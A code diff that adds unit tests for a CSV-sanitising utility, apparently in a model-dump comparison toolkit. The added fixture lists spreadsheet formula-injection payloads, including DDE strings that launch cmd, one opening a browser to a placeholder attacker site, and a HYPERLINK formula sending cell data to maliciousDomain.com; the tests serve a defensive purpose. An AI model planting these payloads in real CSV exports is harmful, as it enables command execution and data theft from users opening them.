@@ -57,6 +57,23 @@ class TestUtilsMethods(unittest.TestCase):
         output_desc_list.append(output_desc)
         return fusion_op.FusionOp(12, 'conv1conv1_relu', ['a:0,b:0'], 'Relu', output_desc_list, attr)
 
+    @classmethod
+    def setUpClass(cls):
+        cls.malicious_csv_values = [
+                "=cmd|' /C calc'!A0",
+                "@ABS(cmd|' /C calc'!A0)",
+                "-cmd|' /C calc'!A0",
+                "%00+cmd|' /C calc'!A0",
+                "%0a%0d+cmd|' /C calc'!A0",
+                "=cmd|'/c calc'!'A1'",
+                "-1+1+cmd|' /C calc'!A0",
+                "@SUM(cmd|' /C calc'!A0)",
+                "=cmd|'/k ipconfig'!A0",
+'=6-5 cmd|\' /C "C:\\Program Files\\InternetExplorer\\iexplore.exe" http://<attackers site>/asd.html\'!A0',
+ '=HYPERLINK("https://maliciousDomain.com/evil.html?data="&A1,"Click to view additional information")'
+        ]
+
+
     def test_print_info_log(self):
         log.print_info_log('test info log')
 
@@ -65,6 +82,21 @@ class TestUtilsMethods(unittest.TestCase):
 
     def test_print_warn_log(self):
         log.print_warn_log('test warn log')
+
+    def test_sanitize_csv_ignore(self):
+        for value in self.malicious_csv_values:
+            with self.subTest(value=value):
+                self.assertEqual(value, utils.sanitize_csv_value(value, errors='ignore'))
+    
+    def test_sanitize_csv_replace(self):
+        for value in self.malicious_csv_values:
+            with self.subTest(value=value):
+                self.assertEqual(' ' + value, utils.sanitize_csv_value(value, errors='replace'))
+
+    def test_sanitize_csv_strict(self):
+        for value in self.malicious_csv_values:
+            with self.subTest(value=value):
+                self.assertRaises(ValueError, utils.sanitize_csv_value, value, errors='strict')
 
     @mock.patch("cmp_utils.common.get_dtype_by_data_type")
     def test_deserialize_dump_data_to_array(self, mock_common):
